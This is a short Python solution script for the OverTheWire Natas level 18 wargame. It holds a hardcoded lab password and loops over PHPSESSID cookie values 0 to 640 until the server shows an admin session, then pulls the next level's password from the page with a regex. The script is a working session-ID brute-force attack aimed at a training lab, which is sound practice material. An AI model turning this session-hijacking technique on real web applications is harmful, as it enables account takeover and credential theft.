import requests
from requests.auth import HTTPBasicAuth
import re

s = requests.Session()
s.auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

url = 'http://natas18.natas.labs.overthewire.org/'


for value in range(641):
    cookies = {"PHPSESSID" : str(value)}
    res = s.post(url=url, cookies=cookies)
    if ("You are an admin" in res.text):
        print(res.text)
        pattern = 'Password:.*(\w{32})'
        password = re.search(pattern, res.text)
        if (password):
            print(password.group())


#'Password:.*(\w{32})'